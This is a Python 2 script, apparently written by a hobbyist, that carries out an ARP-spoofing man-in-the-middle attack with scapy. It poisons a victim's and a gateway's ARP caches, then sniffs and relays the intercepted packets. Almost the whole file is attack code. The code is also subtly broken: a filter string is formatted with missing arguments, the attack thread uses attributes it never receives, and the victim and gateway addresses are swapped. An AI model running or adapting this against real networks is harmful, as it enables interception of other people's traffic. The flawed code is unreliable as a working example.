"""
Author: Doron Goldman
An python program implenting man in the middle attack through arp spoofing
"""
import socket
import scapy.all as sp
import sys
import os
import time
import threading
sp.conf.verb = 0
BROADCAST = "ff:ff:ff:ff:ff:ff"
REPLAY = 2
print "hiiiiiiiiiiiii"

class Attack_Info(object, ):
    def __init__(self, gate_ip, victim_ip, my_ip):
        self.mIP = my_ip
        self.gIP = gate_ip
        self.vIP  = victim_ip
        self.arp_table = {ip: Attack_Info.get_mac(ip) for ip in [self.vIP,self.gIP]} 

    @staticmethod
    def get_mac(IP):
        """
        args:
        IP:  an ip address
        returns: return the corresponding mac adress
        using the basic arp protocol to discover the targets real mac addres
        """
        ans, uans = sp.srp(sp.Ether(dst=BROADCAST) / sp.ARP(pdst=IP),
                        timeout=2, inter=0.1)
        for snd, rcv in ans:
            # format the mac address from the arp replay
            return rcv.sprintf(r"%Ether.src%")
class Attack_Thread(threading.Thread, ):
    TIMEOUT = 25


    @staticmethod
    def set_ip_forward(f):
        """
        args: f: 0 for off; 1 for on
        returns: None
        only supported by linux systems 
        sets ip forwarding in the system 
        """
        os.system("echo %s > /proc/sys/net/ipv4/ip_forward" % (f,))

    
    def __init__(self,):
        self.stop = threading.Event() #used for closing thread and sub threads cleanly
        super(Attack_Thread, self).__init__()

    def close(self,):
        self.stop.clear() 
        sp.send(sp.ARP(op=REPLAY, pdst=self.gIP, psrc=self.vIP, hwdst=BROADCAST,
                    hwsrc=self.arp_table[self.vIP],), count=7)
        sp.send(sp.ARP(op=REPLAY, pdst=self.vIP, psrc=self.gIP, hwdst=BROADCAST,
                    hwsrc=self.arp_table[self.gIP],), count=7)
        self.sniffer.join()

    def run(self, ):
        self.stop.set()
        try:
            bpf_filter = '(not dst host %s) and (not  src host %s) ' % ()
            #bpf_filter = " or ".join(map(lambda x: "(src host %s and dst host %s)" %x,  map(lambda x: tuple(self.arp_table.keys()[::x]), [-1,1])))
            self.sniffer = Mitm_Thread(self.stop, bpf_filter)
            self.sniffer.start()
            self.spoof()
        finally:
            self.close()


    def spoof(self,):
        """
        args : self: an Attack instance
        returns: None
        tells the target you are the gateway and the gateway that you are the target
        """
        #Attack_Thread.set_ip_forward(1)
        while self.stop.wait(0):
            sp.send(sp.ARP(op=REPLAY, pdst=self.vIP, psrc=self.gIP, hwdst=self.arp_table[self.vIP]))
            sp.send(sp.ARP(op=REPLAY, pdst=self.gIP, psrc=self.vIP, hwdst=self.arp_table[self.gIP]))
            time.sleep(Attack_Thread.TIMEOUT)#refresh the targets arp cache every timeout

class Mitm_Thread(threading.Thread):
    """
    This  thread is used for sniffing the packets 
    and then forwarding them + modfying them
    """
    def __init__(self, stop, bpf_filter):
        self.stop = stop
        self.bpf_filter = bpf_filter
        super(Mitm_Thread, self).__init__()

    def run(self, ):
        while self.stop.wait(0):
            sp.sniff(filter=self.bpf_filter, timeout=0.2, prn=self.pkt_handler)
    
    def pkt_handler(self, pkt):
        print pkt.summary()
        sp.send(pkt)

def get_my_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        my_ip = (s.getsockname()[0])
    finally:
        s.close()
    return my_ip

vIP, gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])  
mIP =  socket.gethostbyname(socket.gethostname()) 
info = Attack_Info(vIP, gIP, mIP)
a = Attack_Thread()
a.start()
raw_input()
a.close()


